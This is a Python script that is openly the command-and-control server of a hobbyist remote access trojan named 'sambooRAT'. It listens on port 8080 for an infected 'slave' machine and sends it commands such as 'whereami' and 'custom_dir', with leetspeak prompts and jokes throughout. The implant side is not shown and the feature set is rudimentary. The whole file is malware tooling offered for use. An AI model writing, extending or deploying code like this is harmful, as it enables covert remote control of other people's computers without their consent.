import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))
print("")
print(" Welcome back fellow Samurai, your server is running @ ", host)
print("")
print(" Waiting for connections from slave... (for more info using sambooRAT, visit samboorai.skynet.com.pl) ")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " Connected to sambooRAT server succesfully ")

# Connection Succesful

# Command H4NDL!NG

while 1:

    command = input(str("3NT3R Y0UR C0MM4ND >> "))

#whereami - what dir am I in

    if command == "whereami":
        conn.send(command.encode())
        print("")
        print("Command sent, waiting for 3X3CUT10N")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output: ", files)

    elif command == "pepino":
        print("Welcome back fellow Plewako house member, your server is running @ ", host)
        print("")
        print("nope just a prank.")

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("CustomD1R: "))
        conn.send(user_input.encode())
        print("Command has been sent")
        print("")

    else:
        print("")
        print("You FUCK3D up the C0MM4ND")
